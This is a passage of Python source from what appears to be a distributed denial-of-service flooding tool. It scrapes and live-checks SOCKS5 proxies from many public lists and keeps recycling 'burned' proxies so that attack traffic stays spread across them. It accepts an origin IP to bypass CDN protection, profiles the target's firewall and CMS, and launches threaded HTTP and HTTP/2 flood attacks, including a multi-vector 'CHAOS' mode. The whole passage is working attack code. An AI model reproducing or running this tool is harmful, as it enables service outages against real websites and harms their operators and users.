                                    # Extract IP:PORT
                                    match = re.search(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5})', line)
                                    if match:
                                        p_str = match.group(1)
                                        scavenged_proxies.append(Proxy(p_str.split(":")[0], int(p_str.split(":")[1]), ProxyType.SOCKS5))
                                except: pass
            except: continue
        
        # Remove duplicates
        proxies = list(set(scavenged_proxies))
        if proxies:
            logger.info(f"{bcolors.OKCYAN}MEGA-SCAVENGE: Found {len(proxies):,} potential IPs. Filtering for Live ones...{bcolors.RESET}")
            # [UPGRADED] Real-time Target Latency Check
            proxies = list(ProxyChecker.checkAll(
                set(proxies), timeout=5, threads=min(1000, len(proxies)),
                url=url.human_repr() if url else "http://www.google.id"
            ))
            logger.info(f"{bcolors.OKGREEN}Armageddon Results: {len(proxies):,} Live Indonesian Proxies ready for deployment.{bcolors.RESET}")
        return proxies
    if not proxy_li.exists():
        logger.warning(
            f"{bcolors.WARNING}The file doesn't exist, creating files and downloading proxies.{bcolors.RESET}")
        proxy_li.parent.mkdir(parents=True, exist_ok=True)
        with proxy_li.open("w") as wr:
            Proxies: Set[Proxy] = ProxyManager.DownloadFromConfig(con, proxy_ty)
            logger.info(
                f"{bcolors.OKBLUE}{len(Proxies):,}{bcolors.WARNING} Proxies are getting checked, this may take awhile{bcolors.RESET}!"
            )
            Proxies = ProxyChecker.checkAll(
                Proxies, timeout=5, threads=threads,
                url=url.human_repr() if url else "http://httpbin.org/get",
            )

            if not Proxies:
                exit(
                    "Proxy Check failed, Your network may be the problem"
                    " | The target may not be available."
                )
            stringBuilder = ""
            for proxy in Proxies:
                stringBuilder += (proxy.__str__() + "\n")
            wr.write(stringBuilder)

    # [OPTIMIZED] ULTRA-HARDCORE PROXY LOADER (Van Helsing Edition)
    proxies = []
    if proxy_li.exists():
        with proxy_li.open("r") as f:
            lines = [line.strip() for line in f.read().splitlines() if line.strip()]
            for line in lines:
                try:
                    # Format: user:pass@host:port
                    if "@" in line:
                        auth, endpoint = line.split("@")
                        user, password = auth.split(":")
                        host, port = endpoint.split(":")
                        # Force Create Proxy Object
                        proxies.append(Proxy(host, int(port), ProxyType.SOCKS5, user, password))
                    else:
                        # Fallback for IP:PORT
                        parts = line.split(":")
                        proxies.append(Proxy(parts[0], int(parts[1]), ProxyType.SOCKS5))
                except Exception:
                    pass

    if proxies:
        logger.info(f"{bcolors.WARNING}Proxy Count: {bcolors.OKBLUE}{len(proxies):,}{bcolors.RESET}")
        logger.info(f"{bcolors.OKGREEN}Proxy Loaded Successfully via Hard-Bypass!{bcolors.RESET}")
    else:
        # [OPTIMIZED] AUTO-FAILOVER: SCAVENGER MODE
        logger.warning(f"{bcolors.FAIL}Primary Proxy File Failed or Empty! Activating Scavenger Mode...{bcolors.RESET}")
        logger.info(f"{bcolors.WARNING}Downloading Fresh Proxies from Public Sources...{bcolors.RESET}")
        
        # Fresh Sources (ULTIMATE COLLECTION - 16 SOURCES)
        sources = [
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
            "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
            "https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/socks5.txt",
            "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/socks5.txt",
            "https://raw.githubusercontent.com/Zloi-User/hideip.me/main/socks5.txt",
            "https://raw.githubusercontent.com/ManuGM/proxy-365/main/SOCKS5.txt",
            "https://raw.githubusercontent.com/tuanminpay/live-proxy-list/master/socks5.txt",
            "https://raw.githubusercontent.com/casals-ar/proxy-list/main/socks5",
            "https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/socks5.txt",
            "https://raw.githubusercontent.com/elliottophellia/yakumo/master/results/socks5/global/socks5_checked.txt",
            "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks5.txt",
            "https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/socks5/socks5.txt",
            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
            "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
            "https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS5.txt",
            "https://raw.githubusercontent.com/Jakee8718/Free-Proxies/main/socks5/socks5.txt",
            "https://raw.githubusercontent.com/UrielChaves/File-Proxy/master/Socks5.txt"
        ]
        
        scavenged_proxies = []
        for source in sources:
            try:
                # [PHASE 13] Detect Protocol from Source URL
                p_type = ProxyType.SOCKS5
                if "socks4" in source.lower(): p_type = ProxyType.SOCKS4
                elif "http" in source.lower() and "socks" not in source.lower(): p_type = ProxyType.HTTP
                
                with get(source, timeout=10) as r:
                    if r.status_code == 200:
                        lines = r.text.splitlines()
                        for line in lines:
                            line = line.strip()
                            if ":" in line:
                                try:
                                    parts = line.split(":")
                                    scavenged_proxies.append(Proxy(parts[0], int(parts[1]), p_type))
                                except: pass
            except Exception:
                continue

        # Remove duplicates
        proxies = list(set(scavenged_proxies))
        
        if proxies:
            logger.info(f"{bcolors.OKCYAN}Scavenged {len(proxies):,} proxies. Now Checking for Live ones... (This takes time){bcolors.RESET}")
            # [OPTIMIZED] Verify Scavenged Proxies
            proxies = list(ProxyChecker.checkAll(
                set(proxies), timeout=5, threads=min(1000, len(proxies)),
                url="http://www.google.com" # Check against a reliable target
            ))
            logger.info(f"{bcolors.OKGREEN}Scavenged & Verified {len(proxies):,} Live Proxies!{bcolors.RESET}")
        else:
            logger.info(f"{bcolors.FAIL}Scavenger Failed. Running Direct Attack (DANGEROUS).{bcolors.RESET}")
            proxies = None

    return proxies


def proxy_recycler(proxies_list, con, proxy_li, proxy_ty, url=None):
    global IS_RECYCLING, RECYCLE_EVENT
    while True:
        RECYCLE_EVENT.wait()
        IS_RECYCLING = True
        logger.info(f"{bcolors.WARNING}Proxy Pool Exhausted or Health Low! RECYCLING Fresh IPs...{bcolors.RESET}")
        
        try:
            # Re-run scavenger
            new_proxies = handleProxyList(con, proxy_li, proxy_ty, url)
            if new_proxies:
                # Atomically update the shared list content
                global BURNED_PROXIES
                BURNED_PROXIES.clear()
                
                # Update the shared list
                proxies_list[:] = list(set(proxies_list + new_proxies))
                logger.info(f"{bcolors.OKGREEN}Recycle Success: Pool now has {len(proxies_list):,} total IPs.{bcolors.RESET}")
        except Exception as e:
            logger.error(f"Recycle Error: {e}")
        
        IS_RECYCLING = False
        RECYCLE_EVENT.clear()
        sleep(60) # Prevent rapid fire recycling


async def main_async():
    with suppress(KeyboardInterrupt):
        with suppress(IndexError):
            one = argv[1].upper()

            if one == "HELP":
                raise IndexError()
            if one == "TOOLS":
                ToolsConsole.runConsole()
            if one == "STOP":
                ToolsConsole.stop()

            method = one
            host = None
            port = None
            url = None
            
            # [FIX] Use threading.Event for thread-based HttpFlood, asyncio.Event for async tasks
            event = Event()  # threading.Event — compatible with both Thread.wait() and asyncio tasks
            event.clear()
            target = None
            urlraw = argv[2].strip()
            if not urlraw.startswith("http"): urlraw = "http://" + urlraw

            if method not in Methods.ALL_METHODS:
                exit("Method Not Found")

            if method in Methods.LAYER7_METHODS:
                origin_ip = None
                if "@" in urlraw:
                    parts = urlraw.split("@")
                    urlraw = parts[0]
                    origin_ip = parts[1].strip()

                url = URL(urlraw)
                host = url.host
                host_array = []

                if method != "TOR":
                    try:
                        if origin_ip: host_array = [origin_ip]
                        else:
                            import socket as sys_socket; info = sys_socket.getaddrinfo(url.host, 80)
                            host_array = list(set([str(ip[4][0]) for ip in info]))
                            if not host_array: raise Exception("No A-records")
                            host = host_array[0]
                    except Exception as e:
                        exit('Cannot resolve hostname: ' + str(e))

                threads = int(argv[4])
                rpc = int(argv[6])
                timer = int(argv[7])
                proxy_ty = int(argv[3].strip())
                user_path = argv[5].strip()
                
                if user_path in {"0", "None", "NONE", "none"}: proxy_li = Path("0")
                else:
                    proxy_li = Path(user_path)
                    if not proxy_li.exists(): proxy_li = Path(__dir__ / "files/proxies/" / user_path)
                
                useragent_li = Path(__dir__ / "files/useragent.txt")
                referers_li = Path(__dir__ / "files/referers.txt")
                proxies: Any = set()

                if not useragent_li.exists() or not referers_li.exists(): exit("Missing files")
                uagents = set(a.strip() for a in useragent_li.open("r+").readlines())
                referers = set(a.strip() for a in referers_li.open("r+").readlines())

                discovered_paths = Tools.crawl(urlraw)
                
                # [V8] Auto-detect target stack and suggest best methods
                logger.info(f"{bcolors.OKCYAN}[V8] Profiling target stack...{bcolors.RESET}")
                target_profile = TargetProfiler.profile(urlraw)
                logger.info(f"{bcolors.OKGREEN}[V8] Server: {target_profile['server']} | WAF: {target_profile['waf'] or 'None'} | CMS: {target_profile['cms'] or 'Unknown'}{bcolors.RESET}")
                logger.info(f"{bcolors.OKGREEN}[V8] Recommended Methods: {', '.join(target_profile['methods'])}{bcolors.RESET}")
                
                if method == 'CHAOS':
                    logger.info(f"{bcolors.WARNING}[V8] CHAOS MODE: Multi-vector attack engaged. Rotating methods dynamically.{bcolors.RESET}")
                proxies = handleProxyList(con, proxy_li, proxy_ty, url)
                
                if proxies:
                    Thread(target=proxy_recycler, args=(proxies, con, proxy_li, proxy_ty, url), daemon=True).start()
                    ProxyHealthChecker(proxies, interval=45).start()
                    PROXY_ALIVE_COUNT.set(len(proxies))

                tasks = []
                event.set()  # [FIX] Set event before creating tasks so threads start immediately
                
                if method in {"H2_FLOOD", "GET", "POST"}:
                    for thread_id in range(threads):
                        flood = AsyncHttpFlood(thread_id, url, host, rpc, event, uagents, referers, proxies, discovered_paths, method)
                        flood.host_array = host_array
                        tasks.append(asyncio.create_task(flood._run_async()))
                else:
                    # [FIX] Thread-based methods need run_in_executor to avoid blocking event loop
                    loop = asyncio.get_event_loop()
                    for thread_id in range(threads):
                        flood = HttpFlood(thread_id, url, host, method, rpc, event, uagents, referers, proxies)
                        flood.host_array = host_array
                        flood.crawled_paths = discovered_paths
                        tasks.append(loop.run_in_executor(None, flood.run))
                
                # Status Thread inside async
                async def display_status():
                    ts = time()
                    last_requests = 0
                    last_bytes = 0
                    while time() < ts + timer:
                         current_requests = int(REQUESTS_SENT)
                         current_bytes = int(BYTES_SEND)
                         pps = current_requests - last_requests
                         bps = current_bytes - last_bytes
                         print(f'\rTarget: {target or url.host} | Speed: {Tools.human_format(pps, "PPS")} | Data: {Tools.human_format(bps, "Bps")} | {round((time() - ts) / timer * 100, 1)}%  ', end="")
                         last_requests = current_requests
                         last_bytes = current_bytes
                         await asyncio.sleep(1)
                    print()
                    import os; os._exit(0)

                tasks.append(asyncio.create_task(display_status()))
                await asyncio.gather(*tasks)

        ToolsConsole.usage()

if __name__ == '__main__':
    # [KALI] Platform-specific optimizations
    if IS_LINUX:
        import signal
        signal.signal(signal.SIGPIPE, signal.SIG_IGN)  # Prevent broken pipe crashes
    
    if uvloop_status:
        print(f'{bcolors.OKGREEN}[OPTIMIZED] Using UVLOOP engine (Linux Extreme Performance){bcolors.RESET}')
    
    # Report FD limit
    try:
        import resource as _res
        _soft, _ = _res.getrlimit(_res.RLIMIT_NOFILE)
        print(f'{bcolors.OKCYAN}[SYSTEM] File Descriptor Limit: {_soft:,}{bcolors.RESET}')
    except ImportError:
        pass
    
    asyncio.run(main_async())
